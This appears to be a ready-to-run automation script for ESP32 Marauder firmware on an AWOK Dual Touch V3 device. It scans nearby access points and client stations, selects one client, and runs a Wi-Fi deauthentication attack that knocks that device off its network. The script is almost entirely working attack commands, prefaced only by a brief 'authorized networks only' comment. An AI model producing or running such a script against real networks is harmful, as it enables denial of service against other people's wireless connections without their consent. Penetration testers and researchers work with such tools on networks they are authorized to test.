# deauth_selected_client -- deauth a single client station (not the whole AP)
# Target: AWOK Dual Touch V3, orange (CLI) port, esp32_marauder_dev_board_pro.bin, v1.13.0
# Flow: scanap -> scansta -> list clients -> select client index 0 -> attack -t deauth -c
#   -c = target selected client(s) rather than the AP
# EDIT: change `select -c 0` to the client index shown by `list -c`.
# Duration: ~90 s.  SD: not required.  GPS: not required.
# ACTIVE ATTACK -- authorized networks only.

stopscan
clearlist -a
scanap
DELAY 20000
stopscan
scansta
DELAY 25000
stopscan
list -c
select -c 0
attack -t deauth -c
DELAY 30000
stopscan
